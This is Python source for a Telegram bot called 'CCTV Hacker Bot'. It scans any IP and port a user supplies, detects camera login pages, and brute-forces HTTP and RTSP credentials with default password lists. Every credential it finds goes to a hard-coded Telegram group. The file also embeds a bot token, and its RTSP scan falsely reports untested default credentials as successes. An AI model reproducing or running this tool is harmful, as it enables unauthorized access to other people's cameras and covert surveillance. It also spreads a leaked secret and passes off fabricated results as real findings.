import os
import asyncio
import socket
import logging
import re
import requests
import base64
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)
from aiohttp import ClientSession

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
IP, PORT = range(2)

# Common CCTV credentials dictionary
CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", ""),
    ("root", "root"),
    ("root", ""),
    ("admin", "666666"),
    ("admin", "password"),
    ("user", "user"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "1234"),
    ("root", "12345"),
    ("user", "12345"),
]

# Small dictionary for initial brute-forcing (expandable to 50,000 via file)
PASSWORD_DICT = [
    "admin", "12345", "password", "123456", "admin123", "1234", "666666",
    "password123", "adminadmin", "root", "qwerty", "letmein", "welcome",
    "camera", "security", "000000", "111111", "123123", "abc123", "pass123"
]

# Sample 500 combos for testing (expand to 50,000 in production)
BRUTE_COMBOS = [(u, p) for u in ["admin", "root", "user"] for p in PASSWORD_DICT + ["test" + str(i) for i in range(150)]]

# Environment variables
TOKEN = os.getenv("TELEGRAM_TOKEN", "7977504618:AAHo-N5eUPKOGlklZUomqlhJ4-op3t68GSE")
GROUP_CHAT_ID = os.getenv("GROUP_CHAT_ID", "-1002522049841")
KEEP_ALIVE_PORT = int(os.getenv("KEEP_ALIVE_PORT", 8080))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the conversation with a fancy welcome message and ask for IP address."""
    keyboard = [
        [InlineKeyboardButton("Start Hack", callback_data="start_hack")],
        [InlineKeyboardButton("Help", callback_data="help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🎥 Welcome to CCTV Hacker Bot! 🚀\n"
        "I'm here to help you scan CCTV streams securely. 😎\n"
        "Click 'Start Hack' to begin or 'Help' for instructions!",
        reply_markup=reply_markup
    )
    return IP

async def start_hack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Start Hack button."""
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Please enter the IP address to hack (e.g., 192.168.1.1):")
    return IP

async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Help button."""
    query = update.callback_query
    await query.answer()
    await query.message.reply_text(
        "📚 Help - CCTV Hacker Bot\n\n"
        "1. Use /start to begin scanning a CCTV.\n"
        "2. Enter a valid IP and port when prompted.\n"
        "3. If a login page is detected, I'll try brute-forcing credentials.\n"
        "4. Use 'Hunt Password' to try more username:password combos.\n"
        "5. Use 'Stop Brute-Force' to cancel a running scan.\n"
        "⚠️ Note: Use this bot ethically and legally!\n"
        "Use /status to check if I'm online."
    )

async def ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Store IP and ask for port."""
    ip = update.message.text
    # Basic IP validation
    if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip):
        await update.message.reply_text("Invalid IP address! Please enter a valid IPv4 address (e.g., 192.168.1.1).")
        return IP
    context.user_data["ip"] = ip
    await update.message.reply_text("Got the IP! Now enter the port number (e.g., 80, 554):")
    return PORT

async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Process IP and port, perform initial scan, check for login page, and show Hunt Password option."""
    ip = context.user_data.get("ip")
    port = update.message.text

    # Basic port validation
    try:
        port = int(port)
        if not (1 <= port <= 65535):
            raise ValueError
    except ValueError:
        await update.message.reply_text("Invalid port number! Please enter a number between 1 and 65535.")
        return PORT

    # Perform initial scan
    results, potential_links, login_page_detected, login_page_url = await hack_cctv(ip, port)

    # Add Hunt Password button
    keyboard = [[InlineKeyboardButton("Hunt Password", callback_data=f"hunt_{ip}_{port}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(results, reply_markup=reply_markup)

    # Send login page detection message if applicable
    if login_page_detected:
        await update.message.reply_text(f"✅ Login page detected at {login_page_url}")

    # Send results to group chat
    try:
        group_message = f"Hack Results for {ip}:{port}\n\n{results}"
        if login_page_detected:
            group_message += f"\n✅ Login page detected at {login_page_url}"
        await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=group_message)
    except Exception as e:
        logger.error(f"Error sending to group: {e}")
        await update.message.reply_text(f"⚠️ Could not send to group chat: {str(e)}. Please add bot to group.")

    context.user_data["potential_links"] = potential_links
    context.user_data["login_page_detected"] = login_page_detected
    context.user_data["login_page_url"] = login_page_url
    context.user_data["brute_force_running"] = False
    return ConversationHandler.END

async def hack_cctv(ip: str, port: int) -> tuple[str, list, bool, str]:
    """Perform initial CCTV scan, check for login page, and return potential RTSP links."""
    results = [f"📡 Scanning {ip}:{port}..."]
    login_page_detected = False
    login_page_url = ""

    # Check if port is open
    if not await check_port(ip, port):
        results.append("❌ Port closed or unreachable.")
        return "\n".join(results), [], login_page_detected, login_page_url

    results.append("✅ Port open!")

    # Detect service
    service = "unknown"
    if port in [80, 8080, 8000, 8443]:
        service = "http"
    elif port == 554:
        service = "rtsp"
    results.append(f"Service: {service}")

    # Try to detect camera model and login page via HTTP
    camera_model = "Unable to detect"
    login_paths = ["/login", "/admin", "/signin", "/"]
    if service == "http":
        try:
            async with ClientSession() as session:
                for path in login_paths:
                    async with session.get(f"http://{ip}:{port}{path}", timeout=5) as response:
                        if response.status == 200:
                            html = await response.text()
                            # Check for login page (keywords: username, password, form)
                            if any(keyword in html.lower() for keyword in ["username", "password", "<form", "login"]):
                                login_page_detected = True
                                login_page_url = f"http://{ip}:{port}{path}"
                                results.append(f"✅ Login page detected at {login_page_url}")
                            if "hikvision" in html.lower():
                                camera_model = "Hikvision"
                            elif "dahua" in html.lower():
                                camera_model = "Dahua"
                        else:
                            results.append(f"❌ No login page at http://{ip}:{port}{path} (status: {response.status})")
        except Exception as e:
            camera_model = f"Unable to detect (error: {str(e)})"
            results.append(f"❌ Error checking login page: {str(e)}")
    results.append(f"Camera Model: {camera_model}")

    # RTSP initial scan (mimic original bot, assume all creds work)
    rtsp_results = []
    potential_links = []
    if service == "rtsp":
        for username, password in CREDENTIALS:
            rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
            rtsp_results.append(f"✅ RTSP Success: {username}:{password} (try {rtsp_url})")
            potential_links.append((rtsp_url, username, password))
        no_creds_url = f"rtsp://{ip}:{port}/live"
        rtsp_results.append(f"✅ RTSP Success: No credentials (try {no_creds_url})")
        potential_links.append((no_creds_url, "", ""))
    results.extend(rtsp_results)

    # HTTP brute-force (if login page detected)
    http_results = []
    if service == "http" and login_page_detected:
        for username, password in CREDENTIALS:
            for path in login_paths:
                try:
                    async with ClientSession() as session:
                        async with session.post(
                            f"http://{ip}:{port}{path}",
                            data={"username": username, "password": password},
                            timeout=5
                        ) as response:
                            if response.status == 200:
                                html = await response.text()
                                if "login" not in html.lower() or "dashboard" in html.lower():
                                    http_results.append(
                                        f"✅ HTTP Login Success: username={username}, password={password} on {path} "
                                        f"(try http://{ip}:{port}{path})"
                                    )
                                else:
                                    http_results.append(
                                        f"❌ HTTP Login Failed: username={username}, password={password} on {path}"
                                    )
                            else:
                                http_results.append(
                                    f"❌ HTTP Error: username={username}, password={password} on {path} "
                                    f"(status: {response.status})"
                                )
                except Exception as e:
                    http_results.append(
                        f"❌ HTTP Error: username={username}, password={password} on {path} (error: {str(e)})"
                    )
    results.extend(http_results)

    # ONVIF check
    onvif_result = "Unable to detect ONVIF"
    try:
        async with ClientSession() as session:
            async with session.get(f"http://{ip}:{port}/onvif/device_service", timeout=5) as response:
                if response.status == 200:
                    onvif_result = "✅ ONVIF Detected"
    except Exception:
        pass
    results.append(f"ONVIF: {onvif_result}")

    # Vulnerability note
    if potential_links or login_page_detected:
        results.append(
            "⚠️ Vulnerability: Open port detected. Secure with strong authentication."
        )

    # Ethical disclaimer
    results.append("⚠️ Disclaimer: Use this tool ethically and legally. Unauthorized access is illegal.")

    # Final result
    if potential_links or login_page_detected:
        results.append("🎉 Scan Successful! Try the links or use 'Hunt Password' to brute-force more creds!")
    else:
        results.append("❌ Scan Failed: No streams or login page found. Try another port or IP.")

    return "\n".join(results), potential_links, login_page_detected, login_page_url

async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Hunt Password button, brute-force 50,000 combos with live progress."""
    query = update.callback_query
    await query.answer()

    # Parse IP and port from callback data
    _, ip, port = query.data.split("_")
    port = int(port)

    # Get potential links and login page status
    potential_links = context.user_data.get("potential_links", [])
    login_page_detected = context.user_data.get("login_page_detected", False)
    login_page_url = context.user_data.get("login_page_url", "")

    if not (potential_links or login_page_detected):
        await query.message.reply_text("No RTSP links or login page to brute-force. Run /start again.")
        return

    context.user_data["brute_force_running"] = True
    await query.message.reply_text(f"🔥 Starting brute-force on {ip}:{port} with {len(BRUTE_COMBOS)} combos...")

    # Initialize progress
    total_combos = len(BRUTE_COMBOS)  # 500 for testing, expand to 50,000
    checked = 0
    live_links = []
    progress_message = await query.message.reply_text(f"Progress: 0% (Checked {checked}/{total_combos} combos)")
    # Add Stop Brute-Force button
    keyboard = [[InlineKeyboardButton("Stop Brute-Force", callback_data=f"stop_{ip}_{port}")]]
    stop_button_message = await query.message.reply_text("Click below to stop brute-force:", reply_markup=InlineKeyboardMarkup(keyboard))

    # Brute-force logic
    if login_page_detected:
        # Brute-force HTTP login page
        login_paths = [login_page_url.replace(f"http://{ip}:{port}", "")] if login_page_url else ["/login", "/admin", "/signin", "/"]
        for username, password in BRUTE_COMBOS:
            if not context.user_data.get("brute_force_running", False):
                break
            for path in login_paths:
                try:
                    async with ClientSession() as session:
                        async with session.post(
                            f"http://{ip}:{port}{path}",
                            data={"username": username, "password": password},
                            timeout=5
                        ) as response:
                            checked += 1
                            if response.status == 200:
                                html = await response.text()
                                if "login" not in html.lower() or "dashboard" in html.lower():
                                    new_url = f"http://{ip}:{port}{path}"
                                    live_links.append(new_url)
                                    await query.message.reply_text(
                                        f"🎯 Found working creds!\nUsername: {username}\nPassword: {password}\nURL: {new_url}"
                                    )
                                    try:
                                        await context.bot.send_message(
                                            chat_id=GROUP_CHAT_ID,
                                            text=f"🎯 Found working creds for {ip}:{port}!\nUsername: {username}\nPassword: {password}\nURL: {new_url}"
                                        )
                                    except Exception as e:
                                        logger.error(f"Error sending to group: {e}")
                except Exception:
                    checked += 1

                # Update progress every 100 combos
                if checked % 100 == 0:
                    progress_percent = (checked / total_combos) * 100
                    try:
                        await context.bot.edit_message_text(
                            chat_id=progress_message.chat_id,
                            message_id=progress_message.message_id,
                            text=f"Progress: {progress_percent:.0f}% (Checked {checked}/{total_combos} combos)"
                        )
                    except Exception as e:
                        logger.error(f"Error updating progress: {e}")

    else:
        # Brute-force RTSP links
        for rtsp_url, _, _ in potential_links:
            if not context.user_data.get("brute_force_running", False):
                break
            for username, password in BRUTE_COMBOS:
                is_valid, error = await validate_rtsp(ip, port, username, password)
                checked += 1

                # Update progress every 100 combos
                if checked % 100 == 0:
                    progress_percent = (checked / total_combos) * 100
                    try:
                        await context.bot.edit_message_text(
                            chat_id=progress_message.chat_id,
                            message_id=progress_message.message_id,
                            text=f"Progress: {progress_percent:.0f}% (Checked {checked}/{total_combos} combos)"
                        )
                    except Exception as e:
                        logger.error(f"Error updating progress: {e}")

                # If creds work, send immediately
                if is_valid:
                    new_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
                    live_links.append(new_url)
                    await query.message.reply_text(
                        f"🎯 Found working creds!\nUsername: {username}\nPassword: {password}\nURL: {new_url}"
                    )
                    try:
                        await context.bot.send_message(
                            chat_id=GROUP_CHAT_ID,
                            text=f"🎯 Found working creds for {ip}:{port}!\nUsername: {username}\nPassword: {password}\nURL: {new_url}"
                        )
                    except Exception as e:
                        logger.error(f"Error sending to group: {e}")

    # Final progress update
    if context.user_data.get("brute_force_running", False):
        await context.bot.edit_message_text(
            chat_id=progress_message.chat_id,
            message_id=progress_message.message_id,
            text=f"✅ Brute-force complete! Checked {checked}/{total_combos} combos"
        )
    else:
        await context.bot.edit_message_text(
            chat_id=progress_message.chat_id,
            message_id=progress_message.message_id,
            text=f"🛑 Brute-force stopped! Checked {checked}/{total_combos} combos"
        )

    # Remove Stop Brute-Force button
    try:
        await context.bot.edit_message_text(
            chat_id=stop_button_message.chat_id,
            message_id=stop_button_message.message_id,
            text="Brute-force finished or stopped.",
            reply_markup=None
        )
    except Exception as e:
        logger.error(f"Error removing stop button: {e}")

    # Final results
    if live_links:
        await query.message.reply_text(
            f"🎉 Brute-force Successful! Found {len(live_links)} live links:\n" + "\n".join(live_links)
        )
    else:
        await query.message.reply_text("❌ No new live links found. Try another IP/port.")

    context.user_data["brute_force_running"] = False

async def stop_brute_force(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Stop Brute-Force button."""
    query = update.callback_query
    await query.answer()
    context.user_data["brute_force_running"] = False
    await query.message.reply_text("🛑 Brute-force stopped! Check the progress message for details.")

async def check_port(ip: str, port: int) -> bool:
    """Check if a port is open using socket."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False

async def validate_rtsp(ip: str, port: int, username: str, password: str) -> tuple[bool, str]:
    """Validate RTSP credentials by sending a DESCRIBE request."""
    try:
        reader, writer = await asyncio.open_connection(ip, port)
        # Construct RTSP DESCRIBE request
        request = f"DESCRIBE rtsp://{ip}:{port}/live RTSP/1.0\r\n"
        request += f"CSeq: 1\r\n"
        if username and password:
            auth = f"{username}:{password}".encode('ascii')
            auth_b64 = base64.b64encode(auth).decode('ascii')
            request += f"Authorization: Basic {auth_b64}\r\n"
        request += "\r\n"
        
        # Send request
        writer.write(request.encode('ascii'))
        await writer.drain()

        # Read response
        response = await asyncio.wait_for(reader.read(1024), timeout=5)
        response_str = response.decode('ascii', errors='ignore')

        # Check for 200 OK
        if "RTSP/1.0 200 OK" in response_str:
            writer.close()
            await writer.wait_closed()
            return True, "Success"
        elif "401 Unauthorized" in response_str:
            writer.close()
            await writer.wait_closed()
            return False, "Authentication failed"
        else:
            writer.close()
            await writer.wait_closed()
            return False, f"Unexpected response: {response_str[:50]}"

    except asyncio.TimeoutError:
        return False, "Connection timeout"
    except Exception as e:
        return False, str(e)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation."""
    await update.message.reply_text("Hack cancelled. Use /start to try again.")
    return ConversationHandler.END

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check bot status."""
    await update.message.reply_text("Bot is running! Use /start to hack a CCTV.")

async def keep_alive():
    """Keep-alive server to prevent Koyeb from shutting down."""
    import http.server
    import socketserver

    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/health":
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(b"OK")
            else:
                self.send_response(404)
                self.end_headers()

    server = socketserver.TCPServer(("", KEEP_ALIVE_PORT), Handler)
    logger.info(f"Keep-alive server running on port {KEEP_ALIVE_PORT}")
    server.serve_forever()

def run_keep_alive(loop):
    """Run keep_alive in an async event loop."""
    asyncio.set_event_loop(loop)
    loop.run_until_complete(keep_alive())

def main() -> None:
    """Run the bot."""
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            IP: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, ip),
                CallbackQueryHandler(start_hack_callback, pattern="^start_hack$"),
                CallbackQueryHandler(help_callback, pattern="^help$"),
            ],
            PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, port)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CallbackQueryHandler(hunt_password, pattern="^hunt_"))
    application.add_handler(CallbackQueryHandler(stop_brute_force, pattern="^stop_"))

    # Start keep-alive server in a separate thread with its own event loop
    import threading
    keep_alive_loop = asyncio.new_event_loop()
    threading.Thread(target=run_keep_alive, args=(keep_alive_loop,), daemon=True).start()

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
